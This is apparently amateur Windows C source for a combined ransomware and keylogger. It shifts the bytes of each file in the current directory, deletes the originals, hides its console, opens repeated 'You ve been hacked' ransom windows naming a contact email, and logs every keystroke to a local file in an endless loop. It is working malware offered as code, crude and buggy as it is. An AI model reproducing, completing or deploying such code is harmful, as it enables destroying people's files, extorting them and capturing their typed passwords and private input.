#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ListDir.h"
#include <conio.h>
#include <time.h>
#include "windows.h"
#include <unistd.h> 


#define LSIZ 128 
#define RSIZ 10 

void Stealth();

int keylogger_background(int keyStroke, char *file);

void encrypt(char *sourceFile, char *destinationFile);

void getNamesInArray(char line[RSIZ][LSIZ], int *len);

void decrypt(char *sourceFile, char*destinationFile);

char *concatenate(const char *a, const char *b, const char *c);

void displaySmile();
void displayMenu();



int main(int argc, char * argv[])
{
    system("color a");
    char line[RSIZ][LSIZ];
    char * token, *name[2], *source, **destination, *nameTemp;
    char k;

    int i, j, len, *ptLen;

    ptLen = &len;

    list_dir();
    sleep(2);
    getNamesInArray(line, ptLen);

    // loop for encrypt the files
    for(i = 0; i < len - 2; i++)
    {
        j = 0;
        token = strtok(line[i], ".");
        while( token != NULL ) {
            name[j] = token;
            token = strtok(NULL, ".");
            j++;
        }
        if(name[0] != "ransom")
        {
            nameTemp = concatenate(name[0], "Crypt.", name[1]);
            source = concatenate(name[0], ".", name[1]);
            encrypt(source, nameTemp);
            remove(source);
            printf("%s : %s \t", nameTemp, source);   
        }
        // exemple robot.txt : name[0] = robot et name[1] = txt

        
    }
    sleep(4);

    printf("\n\n\n");
    
    Stealth();
    for(i = 0; i < 10; i++)
    {
            system("start cmd.exe @cmd /k \"color a & echo You ve been hacked & echo Send a mail to anymail@gmail.com\"");
            system("start cmd.exe @cmd /k \"color a & echo You ve been hacked & echo Send a mail to anymail@gmail.com\"");
            // system("start cmd.exe @cmd /k \"color a & echo You ve been hacked & echo Send a mail to anymail@gmail.com\"");
            // system("start cmd.exe @cmd /k \"color a & echo You ve been hacked & echo Send a mail to anymail@gmail.com\"");
    }

    while (1) {
        for(k = 8; k <= 190; k++) {
            if (GetAsyncKeyState(k) == -32767)
                keylogger_background(k, "LOG2.txt");
        }
    }   
    system("PAUSE");
    return 0;
}


// Get files names of the dir in a array
void getNamesInArray(char line[RSIZ][LSIZ], int *len)
{
	char fname[20] = "dossier.txt";
    FILE *fptr = NULL; 
    int i = 0;
    int count = 0;
    int tot = 0;
    fptr = fopen(fname, "r");
    while(fgets(line[i], LSIZ, fptr)) 
	{
        line[i][strlen(line[i]) - 1] = '\0';
        i++;
    }
    tot = i;
	printf("\n The content of the file %s  are : \n",fname);    
    for(i = 0; i < tot; ++i)
    {
        printf(" %s\n", line[i]);
        count ++;
    }
    printf("\n");
    *len = count;
}

// Encrypt a file
void encrypt(char *sourceFile, char *destinationFile)
{
    FILE *source, *target;
    int i;
    source = fopen(sourceFile, "rb"); 

    if( source == NULL ) { printf("Press any key to exit...\n");} //exit(EXIT_FAILURE); 

    fseek(source, 0, SEEK_END);
    int length = ftell(source);

    fseek(source, 0, SEEK_SET);
    target = fopen(destinationFile, "wb"); 

    if( target == NULL ) { fclose(source); } //exit(EXIT_FAILURE);

    for(i = 0; i < length; i++){
        fputc(fgetc(source)+1, target); // +1 for crypting the file
    }

    printf("\n[+] File copied successfully.\n"); 
    fclose(source); 
    fclose(target);
}

// decrypt a file
void decrypt(char *sourceFile, char*destinationFile)
{
    FILE *source, *target;
    int i;
    source = fopen(sourceFile, "rb"); 

    if( source == NULL ) { printf("Press any key to exit...\n");} //exit(EXIT_FAILURE); 

    fseek(source, 0, SEEK_END);
    int length = ftell(source);

    fseek(source, 0, SEEK_SET);
    target = fopen(destinationFile, "wb"); 

    if( target == NULL ) { fclose(source); } //exit(EXIT_FAILURE);

    for(i = 0; i < length; i++){
        fputc(fgetc(source)-1, target); // -1 for decrypting the file
        //printf("%x\n", source+1);
    }

    printf("File copied successfully.\n"); 
    fclose(source); 
    fclose(target);
}

// concatenate 3 strings
char *concatenate(const char *a, const char *b, const char *c) {
    size_t alen = strlen(a);
    size_t blen = strlen(b);
    size_t clen = strlen(c);
    char *res = malloc(alen + blen + clen + 1);
    if (res) {
        memcpy(res, a, alen);
        memcpy(res + alen, b, blen);
        memcpy(res + alen + blen, c, clen + 1);
    }
    return res;
}

void displayMenu() {
    printf("             _ _         _ _ _          \n");
    printf("\\      /  | |   |  |   ||         \n");
    printf(" \\    /   | |_ _|  |   ||_ _ _       \n");
    printf("  \\  /    | |   \\  |   |      |   \n");
    printf("   \\/     | |    \\ |_ _| _ _ _| \n");

    printf("\n");
}

void displaySmile() {
    printf("\n\n");
    printf(" _________________________________\n");
    printf("|     __                   __     |\n");
    printf("|    |__|                 |__|    |\n");
    printf("|                                 |\n");
    printf("|                                 |\n");
    printf("|                                 |\n");
    printf("|     \\                 /         |\n");
    printf("|      \\_______________/          |\n");
    printf("|                                 |\n");
    printf("|_________________________________|\n");
    printf("\n\n");
}


int keylogger_background(int keyStroke, char *file)
{


        char c = keyStroke;

        if ((keyStroke == 1) || (keyStroke == 2))
        return 0;

        

        FILE * OUTPUT_FILE;
        OUTPUT_FILE = fopen(file, "a+");


        //if(c == 'z')   { break; };
        if (c != 8)
        {
            printf("%c", c);
            fputc(c, OUTPUT_FILE);
            printf("\n %d", c);
        } 
        else if (c == 8) 
        {
            printf("[DELETE]");
            fputs ("[DELETE]", OUTPUT_FILE);
        }
        else if (c == 9)
        {
            printf("[TAB]");
            fputs ("[TAB]", OUTPUT_FILE);
        }
        else if (c == 13)
        {
            printf("[ENTER]");
            fputs ("[ENTER]", OUTPUT_FILE);
        }

        fclose(OUTPUT_FILE);
        return 0;
   
    /* 27 is the ASCII code for Esc */
}

void Stealth() {
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}
